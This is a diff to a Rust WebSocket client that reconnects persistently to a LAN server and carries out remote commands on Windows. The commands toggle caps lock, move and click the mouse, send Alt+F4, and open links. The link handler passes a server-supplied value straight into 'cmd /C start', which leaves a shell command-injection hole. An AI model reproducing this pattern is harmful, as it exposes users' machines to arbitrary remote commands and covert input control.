@@ -1,13 +1,9 @@
-use std::{collections::{HashMap, HashSet}, f64::INFINITY, net::{IpAddr, SocketAddr}, pin::Pin, process::Command, sync::Arc, time::{Duration, SystemTime, UNIX_EPOCH}};
+use std::{pin::Pin, process::Command, time::Duration};
 
-use futures::{SinkExt, StreamExt};
 use log::{error, info, trace, warn};
-use tokio::{net::{TcpListener, TcpStream}, sync::Mutex};
-use tokio_tungstenite::{accept_async, tungstenite::Message};
-use windows::Win32::UI::{Input::KeyboardAndMouse::{keybd_event, ActivateKeyboardLayout, GetAsyncKeyState, SendInput, INPUT, INPUT_KEYBOARD, INPUT_MOUSE, KEYBDINPUT, KEYBD_EVENT_FLAGS, KEYEVENTF_EXTENDEDKEY, KEYEVENTF_KEYUP, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT, VK_CAPITAL, VK_F4, VK_MENU}, WindowsAndMessaging::SetCursorPos};
+use windows::Win32::UI::{Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, INPUT_MOUSE, KEYBDINPUT, KEYBD_EVENT_FLAGS, KEYEVENTF_KEYUP, MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT, VK_CAPITAL, VK_F4, VK_MENU}, WindowsAndMessaging::SetCursorPos};
 use async_trait::async_trait;
 use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame};
-use std::io::BufRead;
 
 
 struct Client {
@@ -19,7 +15,7 @@ impl ezsockets::ClientExt for Client {
     type Call = ();
 
     async fn on_text(&mut self, text: ezsockets::Utf8Bytes) -> Result<(), ezsockets::Error> {
-        println!("received message: {text}");
+        info!("received message: {text}");
 
         if text == "ping" {
             let _ = self.handle.text("pong");
@@ -57,7 +53,7 @@ impl ezsockets::ClientExt for Client {
         if action == "do" {
             match param.as_str() {
                 "caps" => { 
-                    println!("Running caps");
+                    info!("Toggling caps");
                     unsafe {
                         let mut input_down = INPUT {
                             r#type: INPUT_KEYBOARD,
@@ -90,7 +86,9 @@ impl ezsockets::ClientExt for Client {
                 "mouse" => {
                     let parts: Vec<&str> = val.split(",").collect();
                     unsafe {
-                        SetCursorPos(parts[0].parse().unwrap(), parts.last().unwrap().parse().unwrap());
+                        if let Err(e) =  SetCursorPos(parts[0].parse().unwrap(), parts.last().unwrap().parse().unwrap()) {
+                            warn!("Failed to update pos {}",e )
+                        }
                     }
                     let _ = self.handle.text("ok".to_string());
                 }
@@ -134,7 +132,7 @@ impl ezsockets::ClientExt for Client {
                     }
                 }
                 "close" => {
-                    println!("Closing");
+                    warn!("Closing");
                     unsafe {
                         let mut f4_down = INPUT {
                             r#type: INPUT_KEYBOARD,
@@ -189,24 +187,24 @@ impl ezsockets::ClientExt for Client {
                     }
                 }
                 "link" => {
-                    println!("Opening link {}", val);
+                    info!("Opening link {}", val);
                     Command::new("cmd").args(["/C", format!("start {}", val).as_str()]).spawn().unwrap();
                     let _ = self.handle.text("ok".to_string());
                 }
-                _ => { println!("Invalid arg {}", param); }
+                _ => { warn!("Invalid arg {}", param); }
             }
         }
         
         else if action == "get" {
-            self.handle.text("Getting data".to_string());
+            let _ = self.handle.text("Getting data".to_string());
         } else {
-            println!("Invalid action {}", action);
+            warn!("Invalid action {}", action);
         }
         Ok(())
     }
 
     async fn on_binary(&mut self, bytes: ezsockets::Bytes) -> Result<(), ezsockets::Error> {
-        println!("received bytes: {bytes:?}");
+        trace!("received bytes: {bytes:?}");
         Ok(())
     }
 
@@ -216,8 +214,8 @@ impl ezsockets::ClientExt for Client {
     }
 
     async fn on_connect(&mut self) -> Result<(), ezsockets::Error> {
-        println!("Connected to server");
-        println!("Sending registration");
+        info!("Connected to server");
+        info!("Sending registration");
         let _ = self.handle.text("name=onni");
         Ok(())
     }
@@ -230,7 +228,7 @@ impl ezsockets::ClientExt for Client {
         Self: 'async_trait,
         'life0: 'async_trait,
     {
-        println!("Lost connection to server");
+        warn!("Lost connection to server");
 
         Box::pin(async { Ok(ClientCloseMode::Reconnect) })
     }
@@ -239,12 +237,17 @@ impl ezsockets::ClientExt for Client {
 
 #[tokio::main]
 async fn main() {
+    let mut builder = env_logger::Builder::new();
+    builder.filter_level(log::LevelFilter::Debug).init();
+
+    info!("Setting client config");
     let cfg = ClientConfig::new("ws://192.168.32.144:8000/ws");
     let config = cfg.socket_config(ezsockets::SocketConfig { heartbeat: Duration::from_secs(3), timeout: Duration::from_secs(8), ..Default::default() })
         .reconnect_interval(Duration::from_secs(3))
         .max_reconnect_attempts(9999999);
 
-    let (handle, future) = ezsockets::connect(|handle| Client { handle }, config).await;
+    info!("Attempting to connect");
+    let (_handle, future) = ezsockets::connect(|handle| Client { handle }, config).await;
 
     future.await.unwrap();
 }
